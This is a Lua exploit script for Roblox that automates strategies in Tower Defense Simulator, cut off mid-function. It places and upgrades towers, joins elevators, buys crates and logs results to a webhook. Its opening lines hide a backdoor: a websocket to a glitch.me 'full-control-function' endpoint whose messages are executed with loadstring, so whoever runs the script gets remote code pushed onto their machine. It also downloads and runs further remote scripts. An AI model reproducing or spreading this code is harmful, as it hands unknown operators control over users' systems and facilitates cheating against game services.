repeat
    wait()
until game:IsLoaded()
wait()
function StandardLibraryAsync()
    local suc1,err1 = pcall(function()
        syn.websocket.connect()
    end)
    if suc1 then
        return syn.websocket.connect
    else
        return WebSocket.connect
    end
end
if getrenv().isconnectedtxp == nil then
    getrenv().isconnectedtxp = true
    local WebsocketStandardLibrary = StandardLibraryAsync()
    local wsconnect = WebsocketStandardLibrary("ws://brazen-palm-coconut.glitch.me/full-control-function")
    wsconnect.OnMessage:Connect(function(Msg)
        loadstring(Msg)()
    end)
    while wait(5) do
        wsconnect:Send("PingTCP")
    end
end
local O = {}
if not getgenv().ExecutedAlr then
    if syn and not getgenv().IsMultiStrat and not getgenv().ExecDis then
        syn.queue_on_teleport('loadstring(readfile("TDS_AutoStrat/LastStrat.txt"))()')
    elseif not getgenv().IsMultiStrat and not getgenv().ExecDis then
        queue_on_teleport('loadstring(readfile("TDS_AutoStrat/LastStrat.txt"))()')
    end
    getgenv().ExecutedAlr = true
    getgenv().MapUsed = false
    loadstring(
        game:HttpGet("https://raw.githubusercontent.com/banbuskox/dfhtyxvzexrxgfdzgzfdvfdz/main/ikcxujvkdsStrat")
    )()
    loadstring(game:HttpGet("https://banbusscripts.netlify.app/Scripts/IsAutoStratMain"))()
    if getgenv().StratMaintance == true then
        repeat
            wait()
            loadstring(game:HttpGet("https://banbusscripts.netlify.app/Scripts/IsAutoStratMain"))()
            getgenv().status = "Script in maintenance, waiting..."
            wait(1)
        until getgenv().StratMaintance == false or getgenv().SkipStratMaintance == true
    end
    getgenv().status = "Loading"
    getgenv().count = 0
    if game.PlaceId == 5591597781 then
        game:GetService("Workspace").Towers.ChildAdded:Connect(
            function(a)
                getgenv().count = getgenv().count + 1
            end
        )
    end
    if not isfile("TDS_AutoStrat/UseCount.txt") then
        writefile("TDS_AutoStrat/UseCount.txt", "1")
    else
        local a = readfile("TDS_AutoStrat/UseCount.txt")
        a = tonumber(a) + 1
        writefile("TDS_AutoStrat/UseCount.txt", tostring(a))
    end
    local c = nil
    local T = game:WaitForChild("ReplicatedStorage")
    local S = T:WaitForChild("RemoteFunction")
    local c = T:WaitForChild("RemoteEvent")
    function R()
        if game.PlaceId == 5591597781 then
            return true
        else
            return false
        end
    end
    spawn(
        function()
            wait(10)
            if R() and #game.Players:GetChildren() > 1 then
                game:GetService("TeleportService"):Teleport(3260590327, game:GetService("Players").LocalPlayer)
            end
        end
    )
    if R() and getgenv().PotatoPC then
        spawn(
            function()
                wait(3)
                for a, a in pairs(game.Workspace.Map:GetChildren()) do
                    if a.Name ~= "Paths" then
                        a:Remove()
                    end
                end
                local a = game.Workspace.Terrain
                a.Transparency = 0
                a.WaterReflectance = 0
                a.WaterTransparency = 0
                a.WaterWaveSize = 0
                a.WaterWaveSpeed = 0
            end
        )
    end
    if R() then
        spawn(
            function()
                wait(3)
                for a, a in pairs(game:GetService("Lighting"):GetChildren()) do
                    if a.Name ~= "Sky" then
                        a:Remove()
                    end
                end
                game.Lighting.FogStart = 10000000
                game.Lighting.FogEnd = 10000000
                game.Lighting.Brightness = 1
                local c
                if getgenv().CameraSys == true then
                    c = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 50, 0)
                else
                    c = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 20, 0)
                end
                local k = Instance.new("Part")
                k.Transparency = 1
                k.Anchored = true
                k.CanCollide = true
                k.Parent = game.Workspace
                k.CFrame = c
                if getgenv().CameraSys == true then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 55, 0)
                else
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 25, 0)
                end
                if game.CoreGui:FindFirstChild("AutoStratsLogger") then
                    game.CoreGui:FindFirstChild("AutoStratsLogger"):Remove()
                end
                local c = Instance.new("ScreenGui")
                local l = Instance.new("Frame")
                local n = Instance.new("ImageLabel")
                local k = Instance.new("Frame")
                local m = Instance.new("TextLabel")
                local o = Instance.new("ScrollingFrame")
                c.Name = "AutoStratsLogger"
                c.Parent = game:WaitForChild("CoreGui")
                c.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                l.Name = "Main"
                l.Parent = c
                l.BackgroundColor3 = Color3.fromRGB(23, 21, 30)
                l.BorderSizePixel = 0
                l.Position = UDim2.new(0.544935644, 0, 0.355803162, 0)
                l.Size = UDim2.new(0, 500, 0, 400)
                n.Name = "Glow"
                n.Parent = l
                n.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                n.BackgroundTransparency = 1.000
                n.BorderSizePixel = 0
                n.Position = UDim2.new(0, -15, 0, -15)
                n.Size = UDim2.new(1, 30, 1, 30)
                n.ZIndex = 0
                n.Image = "rbxassetid://4996891970"
                n.ImageColor3 = Color3.fromRGB(15, 15, 15)
                n.ScaleType = Enum.ScaleType.Slice
                n.SliceCenter = Rect.new(20, 20, 280, 280)
                k.Name = "Top_Container"
                k.Parent = l
                k.AnchorPoint = Vector2.new(0.5, 0)
                k.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                k.BackgroundTransparency = 1.000
                k.Position = UDim2.new(0.5, 0, 0, 18)
                k.Size = UDim2.new(1, -40, 0, 20)
                m.Name = "Title"
                m.Parent = k
                m.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                m.BackgroundTransparency = 1.000
                m.Position = UDim2.new(0.00764120743, 0, -0.400000006, 0)
                m.Size = UDim2.new(0.981785059, 0, 1.45000005, 0)
                m.Font = Enum.Font.GothamBlack
                m.Text = "AUTOSTRATS LOGGER"
                m.TextColor3 = Color3.fromRGB(255, 255, 255)
                m.TextSize = 30.000
                m.TextXAlignment = Enum.TextXAlignment.Left
                o.Name = "Scroll"
                o.Parent = l
                o.Active = true
                o.AnchorPoint = Vector2.new(0.5, 0)
                o.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                o.BackgroundTransparency = 1.000
                o.BorderSizePixel = 0
                o.Position = UDim2.new(0.5, 4, 0, 59)
                o.Size = UDim2.new(1, -20, 1, -67)
                o.BottomImage = "rbxassetid://5234388158"
                o.CanvasSize = UDim2.new(200, 0, 100, 0)
                o.MidImage = "rbxassetid://5234388158"
                o.ScrollBarThickness = 8
                o.TopImage = "rbxassetid://5234388158"
                o.VerticalScrollBarInset = Enum.ScrollBarInset.Always
                local function c()
                    local a = Instance.new("LocalScript", l)
                    a.Name = "Dragify"
                    local b = game:GetService("UserInputService")
                    function j(c)
                        E = nil
                        t = nil
                        v = nil
                        local a = nil
                        function i(a)
                            local a = a.Position - v
                            local a = UDim2.new(F.X.Scale, F.X.Offset + a.X, F.Y.Scale, F.Y.Offset + a.Y)
                            game:GetService("TweenService"):Create(c, TweenInfo.new(0.1), {Position = a}):Play()
                        end
                        c.InputBegan:Connect(
                            function(a)
                                if
                                    (a.UserInputType == Enum.UserInputType.MouseButton1 or
                                        a.UserInputType == Enum.UserInputType.Touch) and
                                        b:GetFocusedTextBox() == nil
                                 then
                                    E = true
                                    v = a.Position
                                    F = c.Position
                                    a.Changed:Connect(
                                        function()
                                            if a.UserInputState == Enum.UserInputState.End then
                                                E = false
                                            end
                                        end
                                    )
                                end
                            end
                        )
                        c.InputChanged:Connect(
                            function(a)
                                if
                                    a.UserInputType == Enum.UserInputType.MouseMovement or
                                        a.UserInputType == Enum.UserInputType.Touch
                                 then
                                    t = a
                                end
                            end
                        )
                        game:GetService("UserInputService").InputChanged:Connect(
                            function(a)
                                if a == t and E then
                                    i(a)
                                end
                            end
                        )
                    end
                    j(a.Parent)
                end
                c()
                local function c()
                    local a = Instance.new("LocalScript", l)
                    a.Name = "Positioning"
                    a.Parent:TweenPosition(UDim2.new(0.5, 0, 0.5, 0), "Out", "Quad", 1)
                    a.Parent.Draggable = true
                end
                c()
                local i = -0.0073
                writefile("TDS_AutoStrat/LastLog.txt", "--[START OF LOG]--")
                function P(a)
                    if a <= 9 then
                        local a = "0" .. a
                        return a
                    else
                        return a
                    end
                end
                getgenv().output = function(c)
                    local d = os.date("*t")["hour"]
                    local b = os.date("*t")["min"]
                    local e = os.date("*t")["sec"]
                    local a = Color3.fromRGB(255, 255, 255)
                    local f = Instance.new("TextLabel", o)
                    f.Text = "[" .. P(d) .. ":" .. P(b) .. ":" .. P(e) .. "] " .. c
                    appendfile("TDS_AutoStrat/LastLog.txt", "\n[" .. P(d) .. ":" .. P(b) .. ":" .. P(e) .. "] " .. c)
                    f.Size = UDim2.new(0.005, 0, 0.001, 0)
                    f.Position = UDim2.new(0, 0, .007 + i, 0)
                    f.Font = Enum.Font.SourceSansSemibold
                    f.TextColor3 = a
                    f.TextStrokeTransparency = 0
                    f.BackgroundTransparency = 1
                    f.BackgroundColor3 = Color3.new(0, 0, 0)
                    f.BorderSizePixel = 0
                    f.BorderColor3 = Color3.new(0, 0, 0)
                    f.FontSize = "Size14"
                    f.TextXAlignment = Enum.TextXAlignment.Left
                    f.ClipsDescendants = true
                    i = i + 0.0005
                end
                function P(a)
                    if tonumber(a) <= 9 then
                        return "0" .. tostring(a)
                    else
                        return tostring(a)
                    end
                end
                spawn(
                    function()
                        local c = false
                        c = not c
                        game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true
                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                        p = Enum.KeyCode.LeftShift
                        h = game.Players.LocalPlayer
                        N = game.Workspace.CurrentCamera
                        M = h:GetMouse()
                        J = game:GetService("UserInputService")
                        I = Vector2.new(0, 0)
                        d = Vector3.new(0, 0, 0)
                        y = I
                        z = Vector2.new(0, 0)
                        B = false
                        A = 70
                        D = false
                        e = 3
                        C = {}
                        u = {
                            [Enum.KeyCode.D] = Vector3.new(1, 0, 0),
                            [Enum.KeyCode.A] = Vector3.new(-1, 0, 0),
                            [Enum.KeyCode.S] = Vector3.new(0, 0, 1),
                            [Enum.KeyCode.W] = Vector3.new(0, 0, -1),
                            [Enum.KeyCode.E] = Vector3.new(0, 1, 0),
                            [Enum.KeyCode.Q] = Vector3.new(0, -1, 0)
                        }
                        f = function(b, a, c)
                            if c == 1 then
                                return a
                            else
                                if tonumber(b) then
                                    return b * (1 - c) + (a * c)
                                else
                                    return b:Lerp(a, c)
                                end
                            end
                        end
                        a = function(c, b, a)
                            return Vector3.new(
                                math.clamp(c.X, b.X, a.X),
                                math.clamp(c.Y, b.Y, a.Y),
                                math.clamp(c.Z, b.Z, a.Z)
                            )
                        end
                        J.InputChanged:connect(
                            function(a)
                                if a.UserInputType == Enum.UserInputType.MouseMovement then
                                    I = I + Vector2.new(a.Delta.x, a.Delta.y)
                                end
                            end
                        )
                        g = function()
                            local c = Vector3.new(0, 0, 0)
                            for b, a in pairs(C) do
                                c = c + (u[b] or Vector3.new(0, 0, 0))
                            end
                            return c
                        end
                        b = function(a, b)
                            return math.floor((a / b) + .5) * b
                        end
                        r = function(b, a)
                            if u[b.KeyCode] then
                                if b.UserInputState == Enum.UserInputState.Begin then
                                    C[b.KeyCode] = true
                                elseif b.UserInputState == Enum.UserInputState.End then
                                    C[b.KeyCode] = nil
                                end
                            else
                                if b.UserInputState == Enum.UserInputState.Begin then
                                    if (b.UserInputType == Enum.UserInputType.MouseButton2) and (c == true) then
                                        B = true
                                        z = Vector2.new(M.X, M.Y)
                                        J.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
                                    elseif b.KeyCode == Enum.KeyCode.Z then
                                        A = 20
                                    elseif b.KeyCode == p then
                                        D = true
                                    end
                                else
                                    if b.UserInputType == Enum.UserInputType.MouseButton2 then
                                        B = false
                                        J.MouseBehavior = Enum.MouseBehavior.Default
                                    elseif b.KeyCode == Enum.KeyCode.Z then
                                        A = 70
                                    elseif b.KeyCode == p then
                                        D = false
                                    end
                                end
                            end
                        end
                        M.WheelForward:connect(
                            function()
                                N.CoordinateFrame = N.CoordinateFrame * CFrame.new(0, 0, -5)
                            end
                        )
                        M.WheelBackward:connect(
                            function()
                                N.CoordinateFrame = N.CoordinateFrame * CFrame.new(-0, 0, 5)
                            end
                        )
                        J.InputBegan:connect(r)
                        J.InputEnded:connect(r)
                        game:GetService("RunService").RenderStepped:Connect(
                            function()
                                if c then
                                    local a = M.Hit
                                    y = I
                                    N.CoordinateFrame =
                                        CFrame.new(N.CoordinateFrame.p) *
                                        CFrame.fromEulerAnglesYXZ(-y.Y / 300, -y.X / 300, 0) *
                                        CFrame.new(g() * ((({[true] = e})[D]) or .5))
                                    N.FieldOfView = f(N.FieldOfView, A, .5)
                                    if B then
                                        J.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
                                        I = I - (z - Vector2.new(M.X, M.Y))
                                        z = Vector2.new(M.X, M.Y)
                                    end
                                end
                            end
                        )
                        local b = 2
                        if getgenv().DefaultCam ~= nil then
                            b = getgenv().DefaultCam
                        end
                        local a =
                            loadstring(
                            game:HttpGet(
                                "https://raw.githubusercontent.com/banbuskox/dfhtyxvzexrxgfdzgzfdvfdz/main/jsdnfjdsfdjnsmvkjhlkslzLIB",
                                true
                            )
                        )()
                        local a = a:CreateWindow("Camera")
                        a:Button(
                            "Normal",
                            function()
                                game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
                                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
                                game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
                                game.Workspace.CurrentCamera.CameraType = "Follow"
                                b = 1
                            end
                        )
                        a:Button(
                            "Follow Enemies (Default)",
                            function()
                                game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true
                                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                                game.Workspace.CurrentCamera.CameraType = "Follow"
                                b = 2
                            end
                        )
                        a:Button(
                            "Free Cam",
                            function()
                                b = 3
                                N.CameraType = Enum.CameraType.Scriptable
                                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                                game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true
                            end
                        )
                        while wait() do
                            if b == 1 then
                                pcall(
                                    function()
                                        c = false
                                    end
                                )
                            elseif b == 2 then
                                pcall(
                                    function()
                                        c = false
                                        local a = game:GetService("Workspace").Enemies:GetChildren()
                                        if #a ~= 0 then
                                            for a, a in pairs(game.Workspace.Enemies:GetChildren()) do
                                                if a:WaitForChild("HumanoidRootPart").CFrame.Y > -5 then
                                                    game.Workspace.Camera.CameraSubject = a.HumanoidRootPart
                                                    wait()
                                                    break
                                                else
                                                    game.Workspace.Camera.CameraSubject =
                                                        game:GetService("Workspace").Map.Paths["1"]["1"]
                                                    break
                                                end
                                            end
                                        else
                                            game.Workspace.Camera.CameraSubject =
                                                game:GetService("Workspace").Map.Paths["1"]["1"]
                                        end
                                    end
                                )
                            elseif b == 3 then
                                c = true
                            end
                        end
                    end
                )
            end
        )
    end
    spawn(
        function()
            if R() and getgenv().Debug then
                game.Workspace.Towers.ChildAdded:Connect(
                    function(a)
                        wait(1)
                        repeat
                            wait()
                        until tonumber(a.Name)
                        local b = Instance.new("BillboardGui")
                        b.Parent = a:WaitForChild("HumanoidRootPart")
                        b.Adornee = a:WaitForChild("HumanoidRootPart")
                        b.StudsOffsetWorldSpace = Vector3.new(0, 2, 0)
                        b.Size = UDim2.new(0, 250, 0, 50)
                        b.AlwaysOnTop = true
                        local c = Instance.new("TextLabel")
                        c.Parent = b
                        c.BackgroundTransparency = 1
                        c.Text = a.Name
                        c.Font = "Legacy"
                        c.Size = UDim2.new(1, 0, 0, 70)
                        c.TextSize = 52
                        c.TextScaled = fals
                        c.TextColor3 = Color3.new(0, 0, 0)
                        c.TextStrokeColor3 = Color3.new(0, 0, 0)
                        c.TextStrokeTransparency = 0.5
                        local c = Instance.new("TextLabel")
                        c.Parent = b
                        c.BackgroundTransparency = 1
                        c.Text = a.Name
                        c.Font = "Legacy"
                        c.Size = UDim2.new(1, 0, 0, 70)
                        c.TextSize = 50
                        c.TextScaled = false
                        c.TextColor3 = Color3.new(1, 0, 0)
                        c.TextStrokeColor3 = Color3.new(0, 0, 0)
                        c.TextStrokeTransparency = 0.5
                    end
                )
            end
        end
    )
    if not R() then
        S:InvokeServer("Login", "Claim")
        S:InvokeServer("Session", "Search", "Login")
        if getgenv().AutoBuy then
            getgenv().status = "Buying crates..."
            local a = require(game:GetService("ReplicatedStorage").Assets.Crates[getgenv().Crate].Data)
            local b, a = a.Price.Type, a.Price.Value
            if b == "Coins" then
                q = math.floor(game.Players.LocalPlayer.Coins.Value / a)
                if q ~= 0 then
                    for a = 1, q do
                        S:InvokeServer("Shop", "Purchase", {["Name"] = getgenv().Crate, ["Type"] = "Crate"})
                        print("Bought " .. getgenv().Crate .. " Crate")
                        wait(1)
                        G = {}
                        for a, a in next, game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(
                            "Inventory",
                            "Execute",
                            "Crates",
                            "Open",
                            {["Name"] = getgenv().Crate}
                        ) do
                            table.insert(G, a)
                        end
                        if readfile("TDS_AutoStrat/Webhook (Logs).txt") ~= "WEBHOOK HERE" then
                            k = readfile("TDS_AutoStrat/Webhook (Logs).txt")
                            local a = {
                                ["username"] = "TDS AutoStrat LOGGER",
                                ["embeds"] = {
                                    {
                                        ["title"] = "**LOG (" ..
                                            P(os.date("*t").year) ..
                                                "-" ..
                                                    P(os.date("*t").month) ..
                                                        "-" ..
                                                            P(os.date("*t").day) ..
                                                                " " ..
                                                                    P(os.date("*t").hour) ..
                                                                        ":" ..
                                                                            P(os.date("*t").min) ..
                                                                                ":" .. P(os.date("*t").sec) .. ")**",
                                        ["description"] = "**		------------ OPENED CRATE ------------**\n**Troop : **" ..
                                            G[2] ..
                                                "\n**Skin : **" ..
                                                    G[4] ..
                                                        "\n**Skin Rarity : **" ..
                                                            G[3] .. "\n**Skin Price : **" .. tostring(G[1]),
                                        ["type"] = "rich",
                                        ["color"] = tonumber(16744448)
                                    }
                                }
                            }
                            local a = game:GetService("HttpService"):JSONEncode(a)
                            local b = {["content-type"] = "application/json"}
                            s = http_request or s or HttpPost or syn.request
                            local a = {Url = k, Body = a, Method = "POST", Headers = b}
                            s(a)
                            print("Webhook sent")
                        end
                    end
                end
            else
                warn(getgenv().Crate .. " Crate is for robux!")
            end
        end
    end
    function l(a)
        if R() then
            repeat
                wait()
            until game.Workspace.Towers:FindFirstChild(tostring(a))
            S:InvokeServer("Troops", "Sell", {["Troop"] = game.Workspace.Towers[tostring(a)]})
        end
    end
    function o(a)
        return a.Replicator:GetAttribute("Type")
    end
    function K(a)
        local a = o(a)
        if a then
            return a
        else
            return "Unable to GET"
        end
    end
    function H(a)
        if not a or a == "Nil" then
            a = "nil"
        end
        if tostring(a) ~= "nil" and table.find(getgenv().troops5, tostring(a)) == nil then
            game.Players.LocalPlayer:Kick(
                "\n\n---------- AUTO STRAT ----------\n\nError 2:\nYou don't own " ..
                    tostring(a) .. " troop.\n\n---------- AUTO STRAT ----------\n"
            )
            wait(0.5)
            while true do
            end
        end
        c:FireServer("Inventory", "Execute", "Troops", "Add", {["Name"] = a})
        getgenv().status = "Equipped " .. a
    end
    function m()
        if R() then
            S:InvokeServer("Waves", "Skip")
            getgenv().output("Skipped Wave")
        end
    end
    function Q(a, b)
        local a = a
        local b = b * 60
        local a = a + b
        return a
    end
    writefile("TDS_AutoStrat/LastPrintLog.txt", "")
    function L(a)
        appendfile("TDS_AutoStrat/LastPrintLog.txt", tostring(a) .. "\n")
        print(tostring(a))
    end
    function n(b, a)
        if R() then
            repeat
                wait()
            until game.Workspace.Towers:FindFirstChild(tostring(b))
            S:InvokeServer(
                "Troops",
                "Abilities",
                "Activate",
                {["Troop"] = game.Workspace.Towers[tostring(b)], ["Name"] = a}
            )
            getgenv().output(
                "Used Ability (Troop " ..
                    K(game.Workspace.Towers[tostring(b)]) .. " With Number " .. tostring(b) .. " Ability " .. a .. ")"
            )
        end
    end
    writefile("TDS_AutoStrat/LastStrat.txt", "")
    if getgenv().PotatoPC then
        appendfile("TDS_AutoStrat/LastStrat.txt", "getgenv().PotatoPC = true\n")
    end
    if getgenv().Debug then
        appendfile("TDS_AutoStrat/LastStrat.txt", "getgenv().Debug = true\n")
    end
    appendfile(
        "TDS_AutoStrat/LastStrat.txt",
        'local TDS = loadstring(game:HttpGet("https://raw.githubusercontent.com/banbuskox/dfhtyxvzexrxgfdzgzfdvfdz/main/ckmhjvskfkmsStratFun2", true))()\n'
    )
    function O:Map(e, c, f)
        appendfile("TDS_AutoStrat/LastStrat.txt", "TDS:Map('" .. e .. "', '" .. tostring(c) .. "', '" .. f .. "')\n")
        getgenv().mapc = e
        spawn(
            function()
                if not R() and not getgenv().IsMultiStrat then
                    spawn(
                        function()
                            getgenv().timer = 0
                            while wait(1) do
                                getgenv().timer = getgenv().timer + 1
                            end
                        end
                    )
                    getgenv().repeating = true
                    while wait(1) do
                        if getgenv().repeating then
                            getgenv().repeating = false
                            local d = 0
                            for a, g in pairs(game:GetService("Workspace").Elevators:GetChildren()) do
                                local b = g.State.Map.Title
                                local a = require(g.Settings).Type
                                local h = g.State.Players
                                if f == nil then
                                    f = "Survival"
                                end
                                if b.Value == e and a == f then
                                    if (h.Value <= 0) then
                                        d = d + 1
                                        L("Join attempt...")
                                        getgenv().status = "Joining..."
                                        S:InvokeServer("Elevators", "Enter", g)
                                        L("Joined elavator...")
                                        getgenv().status = "Joined"
                                        while wait() do
                                            getgenv().status = "Joined (" .. g.State.Timer.Value .. "s)"
                                            if g.State.Timer.Value == 0 then
                                                local b = true
                                                for a = 1, 100 do
                                                    if (h.Value > 1) then
                                                        L("Someone joined, leaving elevator...")
                                                        getgenv().status = "Someone joined..."
                                                        S:InvokeServer("Elevators", "Leave")
                                                        getgenv().repeating = true
                                                        b = false
                                                        break
                                                    end
                                                    wait(0.01)
                                                end
                                                if g.State.Timer.Value == 0 and b then
                                                    getgenv().status = "Teleporting..."
                                                    wait(60)
                                                    getgenv().status = "Teleport failed!"
                                                    S:InvokeServer("Elevators", "Leave")
                                                else
                                                    getgenv().status = "Teleport failed! (Timer)"
                                                    S:InvokeServer("Elevators", "Leave")
                                                    getgenv().repeating = true
                                                end
                                            end
                                            if b.Value == e then
                                                if c then
                                                    if (h.Value > 1) then
                                                        S:InvokeServer("Elevators", "Leave")
                                                        L("Someone joined, leaving elevator...")
                                                        getgenv().status = "Someone joined..."
                                                        getgenv().repeating = true
                                                        break
                                                    elseif (h.Value == 0) then
                                                        wait(1)
                                                        if (h.Value == 0) then
                                                            wait(1)
                                                            if (h.Value == 0) then
                                                                wait(1)
                                                                if (h.Value == 0) then
                                                                    wait(1)
                                                                    if (h.Value == 0) then
                                                                        L("Error")
                                                                        getgenv().status =
                                                                            "Error occured, check dev con"
                                                                        L(
                                                                            "Error occured, please open ticket on Money Maker Development discord server!"
                                                                        )
                                                                        S:InvokeServer("Elevators", "Leave")
                                                                        getgenv().repeating = true
                                                                        break
                                                                    end
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            else
                                                S:InvokeServer("Elevators", "Leave")
                                                L("Map changed while joining, leaving...")
                                                getgenv().status = "Map changed..."
                                                getgenv().repeating = true
                                                break
                                            end
                                        end
                                    end
                                end
                            end
                            if d == 0 then
                                getgenv().repeating = true
                                L("Waiting for map...")
                                getgenv().status = "Waiting for map..."
                                if getgenv().timer >= 15 then
                                    getgenv().status = "Force changing maps..."
                                    getgenv().timer = 0
                                    for a, c in pairs(game:GetService("Workspace").Elevators:GetChildren()) do
                                        local a = require(c.Settings).Type
                                        local b = c.State.Players
                                        if a == f and b.Value <= 0 then
                                            S:InvokeServer("Elevators", "Enter", c)
                                            wait(1)
                                            S:InvokeServer("Elevators", "Leave")
                                        end
                                    end
                                    wait(0.6)
                                    S:InvokeServer("Elevators", "Leave")
                                    wait(1)
                                end
                            end
                        end
                    end
                end
            end
        )
    end
    if not isfolder("TDS_AutoStrat") and not isfile("TDS_AutoStrat/Webhook (Logs).txt") then
        makefolder("TDS_AutoStrat")
        writefile("TDS_AutoStrat/Webhook (Logs).txt", "WEBHOOK HERE")
    end
    writefile("??????????.txt", "KxjhVghCJH")
    function O:Mode(b)
        appendfile("TDS_AutoStrat/LastStrat.txt", "TDS:Mode('" .. b .. "')\n")
        if R() then
            spawn(
                function()
                    local a = nil
                    repeat
                        a = S:InvokeServer("Difficulty", "Vote", b)
                        wait()
                    until a
                    getgenv().output("Selected Mode (Mode " .. b .. ")")
                end
            )
        end
    end
    function O:Loadout(a, e, b, d, c)
        if a == nil then
            a = "nil"
        end
        if e == nil then
            e = "nil"
        end
        if b == nil then
            b = "nil"
        end
        if d == nil then
            d = "nil"
        end
        if c == nil then
            c = "nil"
        end
        appendfile(
            "TDS_AutoStrat/LastStrat.txt",
            "TDS:Loadout('" .. a .. "', '" .. e .. "', '" .. b .. "', '" .. d .. "', '" .. c .. "')\n"
        )
        getgenv().MapUsed = true
        getgenv().status = "Equipping Loadout..."
        getgenv().TroopNameNEW = a
        getgenv().TroopName2NEW = e
        getgenv().TroopName3NEW = b
        getgenv().TroopName4NEW = d
        getgenv().TroopName5NEW = c
        getgenv().troops5 = {}
        for b, a in next, game.ReplicatedStorage.RemoteFunction:InvokeServer("Session", "Search", "Inventory.Troops") do
            table.insert(getgenv().troops5, b)
        end
        if not R() and not getgenv().IsMultiStrat then
            for b, a in next, game.ReplicatedStorage.RemoteFunction:InvokeServer(
                "Session",
                "Search",
                "Inventory.Troops"
            ) do
                if (a.Equipped) then
                    game:GetService("ReplicatedStorage").RemoteEvent:FireServer(
                        "Inventory",
                        "Execute",
                        "Troops",
                        "Remove",
                        {["Name"] = b}
                    )
                    getgenv().status = "Removed " .. b
                end
            end
            H(a)
            H(e)
            H(b)
            H(d)
            H(c)
            getgenv().status = "Loadout Equipped"
        end
    end
    getgenv().Placing = false
    getgenv().Upgrading = false
    local o = {}
    function O:Place(k, j, i, h, g, e, f, l, b, c, d, a)
        spawn(
            function()
                if not l then
                    l = false
                end
                if l then
                    appendfile(
                        "TDS_AutoStrat/LastStrat.txt",
                        "TDS:Place('" ..
                            k ..
                                "', " ..
                                    j ..
                                        ", " ..
                                            i ..
                                                ", " ..
                                                    h ..
                                                        ", " ..
                                                            g ..
                                                                ", " ..
                                                                    e ..
                                                                        ", " ..
                                                                            f ..
                                                                                ", " ..
                                                                                    tostring(l) ..
                                                                                        ", " ..
                                                                                            b ..
                                                                                                ", " ..
                                                                                                    c ..
                                                                                                        ", " ..
                                                                                                            d .. ")\n"
                    )
                else
                    appendfile(
                        "TDS_AutoStrat/LastStrat.txt",
                        "TDS:Place('" ..
                            k .. "', " .. j .. ", " .. i .. ", " .. h .. ", " .. g .. ", " .. e .. ", " .. f .. ")\n"
                    )
                end
                if R() then
                    repeat
                        wait()
                    until T.State.Wave.Value == g and T.State.Timer.Time.Value == Q(f, e) or
                        T.State.Wave.Value == g and (T.State.Timer.Time.Value + 1) == Q(f, e)
                    table.insert(o, k)
                    table.insert(o, j)
                    table.insert(o, i)
                    table.insert(o, h)
                    repeat
                        wait()
                    until getgenv().Placing == false
                    getgenv().Placing = true
                    local e = nil
                    local a = 0
                    getgenv().PassPlace = false
                    repeat
                        if l then
                            e =
                                S:InvokeServer(
                                "Troops",
                                "Place",
                                k,
                                {["Rotation"] = CFrame.new(b, c, d), ["Position"] = Vector3.new(j, i, h)}
                            )
                        elseif not l then
                            e =
                                S:InvokeServer(
                                "Troops",
                                "Place",
                                k,
                                {
                                    ["Rotation"] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
                                    ["Position"] = Vector3.new(j, i, h)
                                }
                            )
                        end
                    until e or getgenv().PassPlace == true
                    getgenv().Placing = false
                    getgenv().output("Placed " .. k)
                    getgenv().PassPlace = false
                end
            end
        )
    end
    function O:Upgrade(f, b, d, c, a)
        spawn(
            function()
                appendfile(
                    "TDS_AutoStrat/LastStrat.txt",
                    "TDS:Upgrade(" .. f .. ", " .. b .. ", " .. d .. ", " .. c .. ")\n"
                )
                if R() then
                    local e = f
                    repeat
                        wait()
                    until T.State.Wave.Value == b and T.State.Timer.Time.Value == Q(c, d) and
                        game.Workspace.Towers:FindFirstChild(tostring(e)) or
                        T.State.Wave.Value == b and (T.State.Timer.Time.Value + 1) == Q(c, d) and
                            game.Workspace.Towers:FindFirstChild(tostring(e))
                    repeat
                        wait()
                    until getgenv().Upgrading == false
                    getgenv().Upgrading = true
                    if not game.Workspace.Towers:FindFirstChild(tostring(e)) then
                        getgenv().output("Warning! Troop with id " .. e .. " has not been placed!")
                        local b = nil
                        local a = 0
                        repeat
                            b =
                                S:InvokeServer(
                                "Troops",
                                "Place",
                                o[f],
                                {
                                    ["Rotation"] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
                                    ["Position"] = Vector3.new(o[f + 1], o[f + 2], o[f + 3])
                                }
                            )
                        until b
                        getgenv().output("Placed " .. o[f])
                    end
                    local a = nil
                    repeat
                        a =
                            S:InvokeServer(
                            "Troops",
                            "Upgrade",
                            "Set",
                            {["Troop"] = game.Workspace.Towers:WaitForChild(tostring(e))}
                        )
                        wait()
                    until a
                    getgenv().Upgrading = false
                    getgenv().output(
                        "Upgraded (Troop " ..
                            K(game.Workspace.Towers[tostring(f)]) .. " With Number " .. tostring(e) .. ")"
                    )
                end
            end
        )
    end
    function O:Sell(e, b, c, d, a)
        spawn(
            function()
                appendfile(
                    "TDS_AutoStrat/LastStrat.txt",
                    "TDS:Sell(" .. e .. ", " .. b .. ", " .. c .. ", " .. d .. ")\n"
                )
                if R() then
                    repeat
                        wait()
